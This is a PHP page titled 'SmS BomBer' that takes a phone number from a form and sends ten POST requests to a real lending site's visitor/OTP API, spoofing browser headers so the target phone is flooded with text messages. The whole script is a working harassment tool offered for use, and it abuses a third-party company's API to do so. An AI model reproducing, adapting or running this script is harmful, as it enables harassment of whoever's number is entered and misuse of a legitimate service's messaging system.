<?php


if (isset($_POST['no'])) {
    
    
    $no = htmlspecialchars($_POST["no"]);
    
    for ($i = 0; $i < 10; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api2.paisabazaar.com/BSP/api/v1/visitor");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"visitId\":\"xxxxxxxx-2a35-4003-a03c-83d075622687\",\"mobileNumber\":\"$no\"}");
        curl_setopt($ch, CURLOPT_POST, 1);
        
        $headers   = array();
        $headers[] = "Host: api2.paisabazaar.com";
       // $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0";
        $headers[] = "Accept: application/json, text/plain, */*";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Accept-Encoding: gzip, deflate";
        $headers[] = "Referer: https://creditreport.paisabazaar.com/bureau/login?utm_source=pb_header_signin_veto";
        $headers[] = "Content-Type: application/json;charset=utf-8";
        $headers[] = "Content-Length: 78";
        $headers[] = "Origin: https://creditreport.paisabazaar.com";
        $headers[] = "Connection: close";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        for ($j = $i; $j < 30; $j++) {
        }
    
    }
}
?>


    <!DOCTYPE html>
    <html>

    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
        <link rel="shortcut icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbC2bMbwW6w1y_EEnlMEcNnpVZiBZpdNBHuuCtuzEMObx5ISIGQw" />
        <link rel="stylesheet" href="css/style.css">
        <title>
            SmS BomBer
        </title>
    </head>

    <body>
        <center>
            <h1 style="color:red">SmS BomBer</h1><h2> <font color="orange">ter</font><font color="white">m</font><font color="green">ux</font></h2><hr><hr>

        </center>
        <div class="mainbox">


            <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" id="submit">
                <div class="cen ">
                    <div id="sqre" class="height">
                        <input type="text" style="color:red" class="in" value=" +91 " multiple>
                        <input type="number" class="in"  style="color:red" name="no" placeholder="Sutariya Parixit" required>
                        <div id="cir1">

                        </div>
                        <div id="cir2">

                            <input type="submit" value="  " class="submit">

                            <i class="fas fa-angle-double-right fa-2x"></i>

                        </div>
                    </div>

                </div>
            </form>

